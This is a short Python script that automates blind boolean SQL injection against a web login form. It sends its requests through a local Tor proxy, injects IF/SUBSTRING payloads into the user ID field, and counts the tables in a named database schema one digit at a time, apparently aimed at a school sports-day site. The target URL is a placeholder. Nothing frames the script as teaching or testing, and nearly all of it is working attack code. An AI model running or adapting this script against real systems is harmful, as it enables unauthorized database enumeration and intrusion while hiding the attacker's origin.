import time
import requests

url = "--target--"
schema = "sch_sportsday_hys_eng"

#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
numbers = [
"0","1","2","3","4","5","6","7","8","9"
]
#DO NOT CHANGE THIS PART

out = open("count.txt","w")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime+"\n")
out.close()
out = open("count.txt","a")

correct = "p"
isCountFinished = False


char = 1
temp = ""

while not isCountFinished:
    for letter in numbers:
        injection = "a' OR IF('"+letter+"'=(SELECT SUBSTRING(COUNT(table_name),"+str(char)+",1) FROM information_schema.tables WHERE table_schema='"+schema+"'),1,'a'); -- "
        print(injection)
        response = requests.post(
            url,
            cookies=cookies,
            data={
            'input_unique_id': injection,
            'input_pass': 'a',
            'btn_login': 'Submit',
            },
            verify=False,
            proxies=prox
        )

        print(response.text)
        #time.sleep(0.3)

        if response.text[40]=='p':
            print("correct, char "+str(char)+": "+letter)
            out.write(letter)
            temp += letter
            char += 1
            break
    else:
        print("count done")
        out.write("\n")
        isCountFinished = True

localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime)